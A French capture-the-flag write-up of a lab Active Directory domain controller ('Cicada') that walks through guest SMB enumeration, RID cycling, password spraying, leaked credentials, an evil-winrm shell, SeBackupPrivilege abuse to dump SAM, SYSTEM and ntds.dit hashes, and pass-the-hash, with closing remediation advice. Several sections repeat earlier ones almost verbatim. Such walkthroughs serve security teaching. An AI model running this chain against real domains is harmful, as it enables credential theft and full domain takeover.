![Cover](cover.png)

### 1. Reconnaissance & Scanning

L'énumération initiale commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque de la cible. Les résultats indiquent un **Windows Domain Controller** (DC) classique au sein du domaine `cicada.htb`.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.35

# Scan de services détaillé sur les ports identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.10.11.35
```

Les services critiques identifiés sont :
*   **DNS (53)**, **Kerberos (88)**, **LDAP (389/636)** : Confirmation du rôle de **Domain Controller**.
*   **SMB (445)** : Vecteur potentiel pour l'énumération de partages.
*   **WinRM (5985)** : Vecteur d'accès à distance si des identifiants sont compromis.

J'ajoute immédiatement l'IP au fichier `/etc/hosts` pour faciliter les requêtes :
`10.10.11.35 CICADA-DC cicada.htb`

---

### 2. Énumération SMB & Information Disclosure

Je commence par tester l'accès anonyme sur **SMB**. Si l'accès anonyme strict est désactivé, le compte `guest` sans mot de passe est souvent activé par défaut sur certaines configurations.

```bash
# Test d'énumération des partages avec le compte guest
netexec smb CICADA-DC -u guest -p '' --shares
```

L'énumération révèle deux partages non standards : `HR` et `DEV`. Le partage `HR` est accessible en lecture pour l'utilisateur `guest`. J'y récupère un fichier nommé `Notice from HR.txt`.

```bash
smbclient -N //10.10.11.35/HR
get "Notice from HR.txt"
```

Le contenu du fichier révèle une politique de mot de passe par défaut pour les nouveaux employés :
**Default Password :** `Cicada$M6Corpb*@Lp#nZp!8`

---

### 3. RID Cycling & User Discovery

Possédant un mot de passe par défaut, j'ai besoin d'une liste d'utilisateurs valides pour tenter un **Password Spraying**. J'utilise la technique du **RID Cycling** via **NetExec**. Cette méthode interroge l'**IPC$** pour énumérer les SIDs (Security Identifiers) et résoudre les noms d'utilisateurs.

```bash
# Extraction des utilisateurs via RID Brute Force
netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

> **Schéma Mental : De l'accès Guest au Password Spraying**
> `Accès Guest SMB` -> `Lecture de documents (HR)` -> `Extraction de mot de passe par défaut` -> `RID Cycling (énumération de la liste d'utilisateurs)` -> `Password Spraying (validation d'un compte actif)`.

---

### 4. Password Spraying & Mouvement Latéral (LDAP)

Je teste le mot de passe récupéré contre la liste d'utilisateurs fraîchement générée.

```bash
# Password Spraying sur SMB
netexec smb CICADA-DC -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

Le compte `michael.wrightson` est valide. Bien que ce compte n'ait pas de privilèges administratifs ou d'accès **WinRM**, il me permet d'interroger l'**Active Directory** via **LDAP** de manière authentifiée.

```bash
# Énumération détaillée des objets utilisateurs via LDAP
netexec ldap CICADA-DC -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

L'énumération **LDAP** révèle une information critique dans le champ **Description** de l'utilisateur `david.orelious` :
`Description: "Just in case I forget my password is aRt$Lp#7t*VQ!3"`

---

### 5. Accès au partage DEV & Extraction de Credentials

Avec les identifiants de `david.orelious`, je ré-énumère les partages **SMB**. Ce nouvel utilisateur a accès au partage `DEV`.

```bash
# Connexion au partage DEV
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //10.10.11.35/DEV
get Backup_script.ps1
```

Le script **PowerShell** `Backup_script.ps1` contient des identifiants en clair utilisés pour automatiser des sauvegardes :
*   **User :** `emily.oscars`
*   **Password :** `Q!3@Lp#M6b*7t*Vt`

---

### 6. Brèche Initiale : Shell via WinRM

Je vérifie si `emily.oscars` possède les droits d'accès à distance. Le flag `(Pwn3d!)` de **NetExec** confirme l'accès administratif ou l'appartenance au groupe **Remote Management Users**.

```bash
# Validation des accès WinRM
netexec winrm CICADA-DC -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

# Obtention du premier shell
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

Je suis désormais authentifié en tant que `emily.oscars` et je peux récupérer le premier flag dans `C:\Users\emily.oscars\Desktop\user.txt`.

---

### Énumération Interne & Mouvement Latéral

Une fois l'accès invité confirmé sur le **SMB**, ma priorité est d'identifier les vecteurs de mouvement latéral en exploitant les informations récoltées précédemment, notamment le mot de passe par défaut trouvé dans la note RH : `Cicada$M6Corpb*@Lp#nZp!8`.

#### 1. Extraction de la liste d'utilisateurs via RID Cycling

N'ayant pas encore de compte utilisateur valide pour interroger l'**Active Directory** via **LDAP**, j'utilise une technique de **RID Cycling** via le protocole **SMB**. Cette méthode permet d'énumérer les objets de sécurité (utilisateurs, groupes) en itérant sur les **Relative Identifiers**.

```bash
# Énumération des utilisateurs via RID Brute Force
netexec smb 10.10.11.35 -u guest -p '' --rid-brute | grep "SidTypeUser" | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

> **Schéma Mental :**
> Accès Guest SMB -> **RID Cycling** (Brute force d'IDs) -> Extraction des noms d'utilisateurs -> Constitution d'une **Wordlist** ciblée.

#### 2. Password Spraying & Premier Pivot

Avec ma liste d'utilisateurs et le mot de passe par défaut, j'effectue un **Password Spraying**. L'objectif est d'identifier un compte n'ayant pas encore modifié ses identifiants initiaux.

```bash
# Attaque par Password Spraying
netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

Le compte `michael.wrightson` est compromis. Bien qu'il n'ait pas d'accès **WinRM**, ses privilèges me permettent d'interroger plus finement le **Domain Controller**.

#### 3. Énumération LDAP & Fuite de Données (Information Leakage)

J'utilise les identifiants de Michael pour effectuer une énumération complète des objets du domaine via **LDAP**. Une pratique courante mais dangereuse consiste à stocker des mots de passe dans les descriptions d'utilisateurs.

```bash
# Extraction des descriptions d'utilisateurs via LDAP
netexec ldap 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

L'attribut `Description` de l'utilisateur `david.orelious` contient un mot de passe en clair : `aRt$Lp#7t*VQ!3`.

#### 4. Analyse du partage DEV & Escalade vers Emily Oscars

En testant les accès de David Orelious, je découvre qu'il possède des droits de lecture sur le partage **SMB** `DEV`, inaccessible auparavant.

```bash
# Énumération du partage DEV
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //10.10.11.35/DEV
get Backup_script.ps1
```

Le script **PowerShell** `Backup_script.ps1` révèle des identifiants codés en dur pour l'utilisateur `emily.oscars` :
- **Username** : `emily.oscars`
- **Password** : `Q!3@Lp#M6b*7t*Vt`

Ce compte est critique car il possède des droits d'accès à distance via **WinRM**.

```bash
# Connexion via Evil-WinRM
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

---

### Escalade de Privilèges : Backup Operators

#### 1. Analyse des privilèges (SeBackupPrivilege)

L'énumération des groupes de l'utilisateur `emily.oscars` montre son appartenance au groupe **Backup Operators**.

```powershell
whoami /priv
# Résultat : SeBackupPrivilege (Enabled), SeRestorePrivilege (Enabled)
```

Le privilège **SeBackupPrivilege** permet de lire n'importe quel fichier sur le système, en ignorant les **Access Control Lists (ACLs)**, afin de permettre la sauvegarde de données sensibles.

> **Schéma Mental :**
> **Backup Operators** -> **SeBackupPrivilege** -> Lecture forcée des fichiers verrouillés -> Extraction des **Registry Hives** -> Récupération des **NTLM Hashes** de l'Administrateur.

#### 2. Extraction des Hives du Registre

Pour compromettre totalement la machine, je vais extraire les ruches **SAM** et **SYSTEM**. Cela permettra de dumper les hashes locaux, dont celui de l'Administrateur.

```powershell
# Sauvegarde des ruches du registre
reg save hklm\sam sam
reg save hklm\system system

# Téléchargement vers la machine attaquante (via Evil-WinRM)
download sam
download system
```

#### 3. Extraction des Hashes & Pass-the-Hash

J'utilise **Impacket** pour extraire les secrets de la base **SAM** locale.

```bash
# Extraction des hashes NTLM
secretsdump.py -sam sam -system system LOCAL
```

Le hash NTLM de l'Administrateur est récupéré : `2b87e7c93a3e8a0ea4a581937016f341`. Je peux maintenant m'authentifier en tant qu'**Administrator** via la technique de **Pass-the-Hash**.

```bash
# Accès final en tant qu'Administrateur
evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

#### 4. Post-Exploitation : Extraction du NTDS.dit (Optionnel)

En tant qu'administrateur avec le **SeBackupPrivilege**, je peux également extraire la base de données de l'**Active Directory** (`ntds.dit`) pour compromettre l'intégralité du domaine.

```powershell
# Utilisation de Diskshadow pour créer un cliché instantané (Shadow Copy)
diskshadow /s script_backup.txt
# Copie du fichier ntds.dit depuis le volume exposé
robocopy /b E:\Windows\ntds . ntds.dit
```

```bash
# Extraction de tous les hashes du domaine
secretsdump.py -ntds ntds.dit -system system LOCAL
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le shell obtenu en tant que `emily.oscars`, ma priorité est l'énumération des privilèges locaux et des appartenances aux groupes. L'utilisateur fait partie du groupe **Backup Operators**.

#### Énumération des Privilèges

Je vérifie les privilèges du jeton actuel :

```powershell
whoami /priv
net user emily.oscars
```

L'utilisateur possède la **SeBackupPrivilege** et la **SeRestorePrivilege**. Le groupe **Backup Operators** est critique car il permet de lire n'importe quel fichier sur le système, en ignorant les **Access Control Lists (ACL)**, afin d'effectuer des opérations de sauvegarde. Sur un **Domain Controller**, cela permet d'accéder aux ruches du registre et au fichier `ntds.dit`.

> **Schéma Mental :**
> Le privilège **SeBackupPrivilege** permet d'appeler des API de lecture de fichiers qui ignorent les vérifications de sécurité NTFS. L'objectif est d'extraire les ruches **SAM** et **SYSTEM** pour récupérer le hash NTLM de l'administrateur local, ou de copier la base **NTDS** pour compromettre l'intégralité du domaine.

#### Extraction des ruches du Registre

Puisque je suis sur un **Domain Controller**, je peux extraire les secrets locaux via le registre pour obtenir un accès **Administrator**.

```powershell
# Sauvegarde des ruches sur la cible
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save

# Téléchargement via Evil-WinRM
download sam.save
download system.save
download security.save
```

#### Extraction des Hashes NTLM

J'utilise la suite **Impacket** pour parser les fichiers récupérés et extraire les hashes :

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Le dump me fournit le hash NTLM de l'utilisateur **Administrator** :
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341`

#### Compromission Totale (Root)

Je valide le hash avec **netexec** puis je me connecte via **Pass-the-Hash** :

```bash
netexec smb 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission d'un **Domain Controller** ne s'arrête pas à l'obtention d'un shell `SYSTEM`. L'étape suivante consiste à exfiltrer la base de données de l'**Active Directory** (`ntds.dit`) pour obtenir les identifiants de tous les utilisateurs du domaine.

#### Extraction du ntds.dit via Diskshadow

Le fichier `ntds.dit` est verrouillé par le processus `lsass.exe`. Pour le copier, je dois créer un **Volume Shadow Copy** (VSS). J'utilise l'outil natif **diskshadow** avec un script de configuration.

**Script `backup.txt` :**
```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

J'exécute le script et je copie le fichier vers mon répertoire de travail :

```powershell
diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit
```

#### Dump complet du Domaine

Une fois le `ntds.dit` et la ruche `SYSTEM` récupérés, je peux extraire tous les hashes du domaine :

```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

**Analyse de la vulnérabilité :**
La compromission de cette machine met en évidence une chaîne de mauvaises configurations classiques :
1.  **Information Disclosure** : Mot de passe par défaut laissé dans un fichier texte accessible en invité.
2.  **Insecure Storage** : Mot de passe stocké en clair dans l'attribut `Description` d'un objet utilisateur LDAP.
3.  **Over-privileged Account** : Un compte de service (utilisé pour des scripts de backup) possède des privilèges d'administration indirecte (**Backup Operators**) sans restriction de connexion, permettant une élévation directe vers **Domain Admin**.

Pour remédier à cela, il est impératif d'appliquer le principe du **Least Privilege**, d'utiliser des **Managed Service Accounts (gMSA)** pour les scripts, et de nettoyer régulièrement les attributs sensibles dans l'**Active Directory**.